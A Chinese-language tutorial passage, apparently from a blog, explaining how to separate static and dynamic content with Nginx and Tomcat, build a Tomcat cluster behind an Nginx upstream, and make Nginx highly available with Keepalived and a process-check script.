Nginx实现动静分离</h2><p>什么是动静分离?</p><p>动:后台应用程序的业务处理</p><p>静:网站的静态资源(html,javaScript,css,images等文件)</p><p>分离:将两者进行分开部署访问，提供用户进行访问。举例说明就是以后所有和静态资源相关的内容都交给Nginx来部署访问，非静态内容则交个类似于Tomcat的服务器来部署访问。</p><p>为什么要动静分离?</p><p>​前面我们介绍过Nginx在处理静态资源的时候，效率是非常高的，而且Nginx的并发访问量也是名列前茅，而Tomcat则相对比较弱一些，所以把静态资源交个Nginx后，可以减轻Tomcat服务器的访问压力并提高静态资源的访问速度。</p><p>​动静分离以后，降低了动态资源和静态资源的耦合度。如动态资源宕机了也不影响静态资源的展示。</p><p>如何实现动静分离?</p><p>实现动静分离的方式很多，比如静态资源可以部署到CDN、Nginx等服务器上，动态资源可以部署到Tomcat,weblogic或者websphere上。本次课程只要使用Nginx+Tomcat来实现动静分离。</p><h3 id="需求分析-3"><a class="markdownIt-Anchor" href="#需求分析-3"></a> 需求分析</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604422564855.png" alt="1604422564855" /></p><h3 id="动静分离实现步骤"><a class="markdownIt-Anchor" href="#动静分离实现步骤"></a> 动静分离实现步骤</h3><p>1.将demo.war项目中的静态资源都删除掉，重新打包生成一个war包，在资料中有提供。</p><p>2.将war包部署到tomcat中，把之前部署的内容删除掉</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">进入到tomcat的webapps目录下，将之前的内容删除掉<br>将新的war包复制到webapps下<br>将tomcat启动<br></code></pre></td></tr></table></figure><p>3.在Nginx所在服务器创建如下目录，并将对应的静态资源放入指定的位置</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604493947499.png" alt="1604493947499" /></p><p>其中index.html页面的内容如下:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/jquery.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        $(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">           $.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;http://192.168.200.133/demo/getAddress&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)&#123;</span><br><span class="language-javascript">               $(<span class="hljs-string">&quot;#msg&quot;</span>).<span class="hljs-title function_">html</span>(data);</span><br><span class="language-javascript">           &#125;);</span><br><span class="language-javascript">        &#125;);</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;images/logo.png&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Nginx如何将请求转发到后端服务器<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;msg&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;images/mv.png&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>4.配置Nginx的静态资源与动态资源的访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs conf">upstream webservice&#123;<br>   server 192.168.200.146:8080;<br>&#125;<br>server &#123;<br>        listen       80;<br>        server_name  localhost;<br><br>        #动态资源<br>        location /demo &#123;<br>                proxy_pass http://webservice;<br>        &#125;<br>        #静态资源<br>        location ~/.*\.(png|jpg|gif|js)&#123;<br>                root html/web;<br>                gzip on;<br>        &#125;<br><br>        location / &#123;<br>            root   html/web;<br>            index  index.html index.htm;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>5.启动测试，访问http://192.168.200.133/index.html</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604494128097.png" alt="1604494128097" /></p><p>假如某个时间点，由于某个原因导致Tomcat后的服务器宕机了，我们再次访问Nginx,会得到如下效果，用户还是能看到页面，只是缺失了访问次数的统计，这就是前后端耦合度降低的效果，并且整个请求只和后的服务器交互了一次，js和images都直接从Nginx返回，提供了效率，降低了后的服务器的压力。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604494156197.png" alt="1604494156197" /></p><h2 id="nginx实现tomcat集群搭建"><a class="markdownIt-Anchor" href="#nginx实现tomcat集群搭建"></a> Nginx实现Tomcat集群搭建</h2><p>在使用Nginx和Tomcat部署项目的时候，我们使用的是一台Nginx服务器和一台Tomcat服务器，效果图如下:</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604494256017.png" alt="1604494256017" /></p><p>那么问题来了，如果Tomcat的真的宕机了，整个系统就会不完整，所以如何解决上述问题，一台服务器容易宕机，那就多搭建几台Tomcat服务器，这样的话就提升了后的服务器的可用性。这也就是我们常说的集群，搭建Tomcat的集群需要用到了Nginx的反向代理和赋值均衡的知识，具体如何来实现?我们先来分析下原理</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604494269848.png" alt="1604494269848" /></p><p>环境准备：</p><p>(1)准备3台tomcat,使用端口进行区分[实际环境应该是三台服务器]，<a href="http://xn--server-2g0js76l.ml">修改server.ml</a>，将端口修改分别修改为8080,8180,8280</p><p>(2)启动tomcat并访问测试，</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.146</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/demo/g</span>etAddress<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604494822961.png" alt="1604494822961" /></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.146</span>:<span class="hljs-number">8180</span><span class="hljs-regexp">/demo/g</span>etAddress<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604494843886.png" alt="1604494843886" /></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.146</span>:<span class="hljs-number">8280</span><span class="hljs-regexp">/demo/g</span>etAddress<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604494860954.png" alt="1604494860954" /></p><p>(3)在Nginx对应的配置文件中添加如下内容:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">upstream</span> webservice&#123;<br>        <span class="hljs-attribute">server</span> <span class="hljs-number">192.168.200.146:8080</span>;<br>        <span class="hljs-attribute">server</span> <span class="hljs-number">192.168.200.146:8180</span>;<br>        <span class="hljs-attribute">server</span> <span class="hljs-number">192.168.200.146:8280</span>;<br>    &#125;<br><br></code></pre></td></tr></table></figure><p>好了，完成了上述环境的部署，我们已经解决了Tomcat的高可用性，一台服务器宕机，还有其他两条对外提供服务，同时也可以实现后台服务器的不间断更新。但是新问题出现了，上述环境中，如果是Nginx宕机了呢，那么整套系统都将服务对外提供服务了，这个如何解决？</p><h2 id="nginx高可用解决方案"><a class="markdownIt-Anchor" href="#nginx高可用解决方案"></a> Nginx高可用解决方案</h2><p>针对于上面提到的问题，我们来分析下要想解决上述问题，需要面临哪些问题?</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604495169905.png" alt="1604495169905" /></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">需要两台以上的Nginx服务器对外提供服务，这样的话就可以解决其中一台宕机了，另外一台还能对外提供服务，但是如果是两台Nginx服务器的话，会有两个<span class="hljs-built_in">IP</span>地址，用户该访问哪台服务器，用户怎么知道哪台是好的，哪台是宕机了的?<br></code></pre></td></tr></table></figure><h3 id="keepalived"><a class="markdownIt-Anchor" href="#keepalived"></a> Keepalived</h3><p>使用Keepalived来解决，Keepalived 软件由 C 编写的，最初是专为 LVS 负载均衡软件设计的，Keepalived 软件主要是通过 VRRP 协议实现高可用功能。</p><h3 id="vrrp介绍"><a class="markdownIt-Anchor" href="#vrrp介绍"></a> VRRP介绍</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604495824757.png" alt="1604495824757" /></p><p>VRRP（Virtual Route Redundancy Protocol）协议，翻译过来为虚拟路由冗余协议。VRRP协议将两台或多台路由器设备虚拟成一个设备，对外提供虚拟路由器IP,而在路由器组内部，如果实际拥有这个对外IP的路由器如果工作正常的话就是MASTER,MASTER实现针对虚拟路由器IP的各种网络功能。其他设备不拥有该虚拟IP，状态为BACKUP,处了接收MASTER的VRRP状态通告信息以外，不执行对外的网络功能。当主机失效时，BACKUP将接管原先MASTER的网络功能。</p><p>从上面的介绍信息获取到的内容就是VRRP是一种协议，那这个协议是用来干什么的？</p><p>1.选择协议</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">VRRP</span>可以把一个虚拟路由器的责任动态分配到局域网上的 VRRP 路由器中的一台。其中的虚拟路由即Virtual路由是由VRRP路由群组创建的一个不真实存在的路由，这个虚拟路由也是有对应的IP地址。而且VRRP路由<span class="hljs-number">1</span>和VRRP路由<span class="hljs-number">2</span>之间会有竞争选择，通过选择会产生一个Master路由和一个Backup路由。<br></code></pre></td></tr></table></figure><p>2.路由容错协议</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-literal">Master</span>路由和Backup路由之间会有一个心跳检测，<span class="hljs-literal">Master</span>会定时告知Backup自己的状态，如果在指定的时间内，Backup没有接收到这个通知内容，Backup就会替代<span class="hljs-literal">Master</span>成为新的<span class="hljs-literal">Master</span>。<span class="hljs-literal">Master</span>路由有一个特权就是虚拟路由和后端服务器都是通过<span class="hljs-literal">Master</span>进行数据传递交互的，而备份节点则会直接丢弃这些请求和数据，不做处理，只是去监听<span class="hljs-literal">Master</span>的状态<br></code></pre></td></tr></table></figure><p>用了Keepalived后，解决方案如下:</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604495442179.png" alt="1604495442179" /></p><h3 id="环境搭建"><a class="markdownIt-Anchor" href="#环境搭建"></a> 环境搭建</h3><p>环境准备</p><table><thead><tr><th>VIP</th><th>IP</th><th>主机名</th><th>主/从</th></tr></thead><tbody><tr><td></td><td>192.168.200.133</td><td>keepalived1</td><td>Master</td></tr><tr><td>192.168.200.222</td><td></td><td></td><td></td></tr><tr><td></td><td>192.168.200.122</td><td>keepalived2</td><td>Backup</td></tr></tbody></table><p>keepalived的安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">步骤1:从官方网站下载keepalived,官网地址https://keepalived.org/<br>步骤2:将下载的资源上传到服务器<br>keepalived-2.0.20.tar.gz<br>步骤3:创建keepalived目录，方便管理资源<br><span class="hljs-built_in">mkdir</span> keepalived<br>步骤4:将压缩文件进行解压缩，解压缩到指定的目录<br>tar -zxf keepalived-2.0.20.tar.gz -C keepalived/<br>步骤5:对keepalived进行配置，编译和安装<br><span class="hljs-built_in">cd</span> keepalived/keepalived-2.0.20<br>./configure --sysconf=/etc --prefix=/usr/local<br>make &amp;&amp; make install<br></code></pre></td></tr></table></figure><p>安装完成后，有两个文件需要我们认识下，一个是 <code>/etc/keepalived/keepalived.conf</code>(keepalived的系统配置文件，我们主要操作的就是该文件)，一个是/usr/local/sbin目录下的<code>keepalived</code>,是系统配置脚本，用来启动和关闭keepalived</p><h3 id="keepalived配置文件介绍"><a class="markdownIt-Anchor" href="#keepalived配置文件介绍"></a> Keepalived配置文件介绍</h3><p>打开keepalived.conf配置文件</p><p>这里面会分三部，第一部分是global全局配置、第二部分是vrrp相关配置、第三部分是LVS相关配置。<br />本次课程主要是使用keepalived实现高可用部署，没有用到LVS，所以我们重点关注的是前两部分</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">global</span>全局部分：<br>global_defs &#123;<br>   <span class="hljs-meta">#通知邮件，当keepalived发送切换时需要发email给具体的邮箱地址</span><br>   notification_email &#123;<br>     tom<span class="hljs-symbol">@itcast</span>.cn<br>     jerry<span class="hljs-symbol">@itcast</span>.cn<br>   &#125;<br>   <span class="hljs-meta">#设置发件人的邮箱信息</span><br>   notification_email_from zhaomin<span class="hljs-symbol">@itcast</span>.cn<br>   <span class="hljs-meta">#指定smpt服务地址</span><br>   smtp_server <span class="hljs-number">192.168</span><span class="hljs-number">.200</span><span class="hljs-number">.1</span><br>   <span class="hljs-meta">#指定smpt服务连接超时时间</span><br>   smtp_connect_timeout <span class="hljs-number">30</span><br>   <span class="hljs-meta">#运行keepalived服务器的一个标识，可以用作发送邮件的主题信息</span><br>   router_id LVS_DEVEL<br>   <br>   <span class="hljs-meta">#默认是不跳过检查。检查收到的VRRP通告中的所有地址可能会比较耗时，设置此命令的意思是，如果通告与接收的上一个通告来自相同的master路由器，则不执行检查(跳过检查)</span><br>   vrrp_skip_check_adv_addr<br>   <span class="hljs-meta">#严格遵守VRRP协议。</span><br>   vrrp_strict<br>   <span class="hljs-meta">#在一个接口发送的两个免费ARP之间的延迟。可以精确到毫秒级。默认是0</span><br>   vrrp_garp_interval <span class="hljs-number">0</span><br>   <span class="hljs-meta">#在一个网卡上每组na消息之间的延迟时间，默认为0</span><br>   vrrp_gna_interval <span class="hljs-number">0</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs pf">VRRP部分，该部分可以包含以下四个子模块<br><span class="hljs-number">1</span>. vrrp_script<br><span class="hljs-number">2</span>. vrrp_sync_group<br><span class="hljs-number">3</span>. garp_group<br><span class="hljs-number">4</span>. vrrp_instance<br>我们会用到第一个和第四个，<br><span class="hljs-comment">#设置keepalived实例的相关信息，VI_1为VRRP实例名称</span><br>vrrp_instance VI_1 &#123;<br>    <span class="hljs-keyword">state</span> MASTER  <span class="hljs-comment">#有两个值可选MASTER主 BACKUP备</span><br>    interface ens33<span class="hljs-comment">#vrrp实例绑定的接口，用于发送VRRP包[当前服务器使用的网卡名称]</span><br>    virtual_router_id <span class="hljs-number">51</span><span class="hljs-comment">#指定VRRP实例ID，范围是0-255</span><br>    priority <span class="hljs-number">100</span><span class="hljs-comment">#指定优先级，优先级高的将成为MASTER</span><br>    advert_int <span class="hljs-number">1</span><span class="hljs-comment">#指定发送VRRP通告的间隔，单位是秒</span><br>    authentication &#123;<span class="hljs-comment">#vrrp之间通信的认证信息</span><br>        auth_type PASS<span class="hljs-comment">#指定认证方式。PASS简单密码认证(推荐)</span><br>        auth_pass <span class="hljs-number">1111</span><span class="hljs-comment">#指定认证使用的密码，最多8位</span><br>    &#125;<br>    virtual_ipaddress &#123; <span class="hljs-comment">#虚拟IP地址设置虚拟IP地址，供用户访问使用，可设置多个，一行一个</span><br>        <span class="hljs-number">192.168</span>.<span class="hljs-number">200.222</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>配置内容如下:</p><p>服务器1</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">global_defs &#123;<br>   notification_email &#123;<br>        <span class="hljs-symbol">tom@</span>itcast.cn<br>        <span class="hljs-symbol">jerry@</span>itcast.cn<br>   &#125;<br>   notification_email_from <span class="hljs-symbol">zhaomin@</span>itcast.cn<br>   smtp_server <span class="hljs-number">192.168</span><span class="hljs-number">.200</span><span class="hljs-number">.1</span><br>   smtp_connect_timeout <span class="hljs-number">30</span><br>   router_id keepalived1<br>   vrrp_skip_check_adv_addr<br>   vrrp_strict<br>   vrrp_garp_interval <span class="hljs-number">0</span><br>   vrrp_gna_interval <span class="hljs-number">0</span><br>&#125;<br><br>vrrp_instance VI_1 &#123;<br>    state MASTER<br>    <span class="hljs-keyword">interface</span> <span class="hljs-symbol">ens33</span><br>    <span class="hljs-symbol">virtual_router_id</span> <span class="hljs-symbol">51</span><br>    <span class="hljs-symbol">priority</span> <span class="hljs-symbol">100</span><br>    <span class="hljs-symbol">advert_int</span> <span class="hljs-symbol">1</span><br>    <span class="hljs-symbol">authentication</span> &#123;<br>        auth_type PASS<br>        auth_pass <span class="hljs-number">1111</span><br>    &#125;<br>    virtual_ipaddress &#123;<br>        <span class="hljs-number">192.168</span><span class="hljs-number">.200</span><span class="hljs-number">.222</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>服务器2</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">! Configuration File <span class="hljs-keyword">for</span> keepalived<br><br>global_defs &#123;<br>   notification_email &#123;<br>        <span class="hljs-symbol">tom@</span>itcast.cn<br>        <span class="hljs-symbol">jerry@</span>itcast.cn<br>   &#125;<br>   notification_email_from <span class="hljs-symbol">zhaomin@</span>itcast.cn<br>   smtp_server <span class="hljs-number">192.168</span><span class="hljs-number">.200</span><span class="hljs-number">.1</span><br>   smtp_connect_timeout <span class="hljs-number">30</span><br>   router_id keepalived2<br>   vrrp_skip_check_adv_addr<br>   vrrp_strict<br>   vrrp_garp_interval <span class="hljs-number">0</span><br>   vrrp_gna_interval <span class="hljs-number">0</span><br>&#125;<br><br>vrrp_instance VI_1 &#123;<br>    state BACKUP<br>    <span class="hljs-keyword">interface</span> <span class="hljs-symbol">ens33</span><br>    <span class="hljs-symbol">virtual_router_id</span> <span class="hljs-symbol">51</span><br>    <span class="hljs-symbol">priority</span> <span class="hljs-symbol">90</span><br>    <span class="hljs-symbol">advert_int</span> <span class="hljs-symbol">1</span><br>    <span class="hljs-symbol">authentication</span> &#123;<br>        auth_type PASS<br>        auth_pass <span class="hljs-number">1111</span><br>    &#125;<br>    virtual_ipaddress &#123;<br>        <span class="hljs-number">192.168</span><span class="hljs-number">.200</span><span class="hljs-number">.222</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="访问测试"><a class="markdownIt-Anchor" href="#访问测试"></a> 访问测试</h3><ol><li>启动keepalived之前，咱们先使用命令 <code>ip a</code>,查看192.168.200.133和192.168.200.122这两台服务器的IP情况。</li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604599529242.png" alt="1604599529242" /></p><ol start="2"><li>分别启动两台服务器的keepalived</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /usr/local/sbin<br>./keepalived<br></code></pre></td></tr></table></figure><p>再次通过 <code>ip a</code>查看ip</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604599616821.png" alt="1604599616821" /></p><ol start="3"><li>当把192.168.200.133服务器上的keepalived关闭后，再次查看ip</li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604599709822.png" alt="1604599709822" /></p><p>通过上述的测试，我们会发现，虚拟IP(VIP)会在MASTER节点上，当MASTER节点上的keepalived出问题以后，因为BACKUP无法收到MASTER发出的VRRP状态通过信息，就会直接升为MASTER。VIP也会&quot;漂移&quot;到新的MASTER。</p><p>上面测试和Nginx有什么关系?</p><p>我们把192.168.200.133服务器的keepalived再次启动下，由于它的优先级高于服务器192.168.200.122的，所有它会再次成为MASTER，VIP也会&quot;漂移&quot;过去，然后我们再次通过浏览器访问:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.222</span>/<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604600079149.png" alt="1604600079149" /></p><p>如果把192.168.200.133服务器的keepalived关闭掉，再次访问相同的地址</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604600145318.png" alt="1604600145318" /></p><p>效果实现了以后， 我们会发现要想让vip进行切换，就必须要把服务器上的keepalived进行关闭，而什么时候关闭keepalived呢?应该是在keepalived所在服务器的nginx出现问题后，把keepalived关闭掉，就可以让VIP执行另外一台服务器，但是现在这所有的操作都是通过手动来完成的，我们如何能让系统自动判断当前服务器的nginx是否正确启动，如果没有，要能让VIP自动进行&quot;漂移&quot;，这个问题该如何解决?</p><h3 id="keepalived之vrrp_script"><a class="markdownIt-Anchor" href="#keepalived之vrrp_script"></a> keepalived之vrrp_script</h3><p>keepalived只能做到对网络故障和keepalived本身的监控，即当出现网络故障或者keepalived本身出现问题时，进行切换。但是这些还不够，我们还需要监控keepalived所在服务器上的其他业务，比如Nginx,如果Nginx出现异常了，仅仅keepalived保持正常，是无法完成系统的正常工作的，因此需要根据业务进程的运行状态决定是否需要进行主备切换，这个时候，我们可以通过编写脚本对业务进程进行检测监控。</p><p>实现步骤:</p><ol><li>在keepalived配置文件中添加对应的配置像</li></ol><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">vrrp_script</span> 脚本名称<br>&#123;<br>    <span class="hljs-attribute">script</span> <span class="hljs-string">&quot;脚本位置&quot;</span><br>    interval <span class="hljs-number">3</span> <span class="hljs-comment">#执行时间间隔</span><br>    weight -<span class="hljs-number">20</span> <span class="hljs-comment">#动态调整vrrp_instance的优先级</span><br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li>编写脚本</li></ol><p>ck_nginx.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>num=`ps -C nginx --no-header | <span class="hljs-built_in">wc</span> -l`<br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$num</span> -eq 0 ];<span class="hljs-keyword">then</span><br> /usr/local/nginx/sbin/nginx<br> <span class="hljs-built_in">sleep</span> 2<br> <span class="hljs-keyword">if</span> [ `ps -C nginx --no-header | <span class="hljs-built_in">wc</span> -l` -eq 0 ]; <span class="hljs-keyword">then</span><br>  killall keepalived<br> <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><p>Linux ps命令用于显示当前进程 (process) 的状态。</p><p>-C(command) :指定命令的所有进程</p><p>–no-header 排除标题</p><ol start="3"><li>为脚本文件设置权限</li></ol><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">chmod</span> <span class="hljs-number">755</span> ck_nginx.sh<br></code></pre></td></tr></table></figure><ol start="4"><li>将脚本添加到</li></ol><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">vrrp_script ck_nginx &#123;<br>   script <span class="hljs-string">&quot;/etc/keepalived/ck_nginx.sh&quot;</span> #执行脚本的位置<br>   <span class="hljs-built_in">int</span>erval <span class="hljs-number">2</span>#执行脚本的周期，秒为单位<br>   weight <span 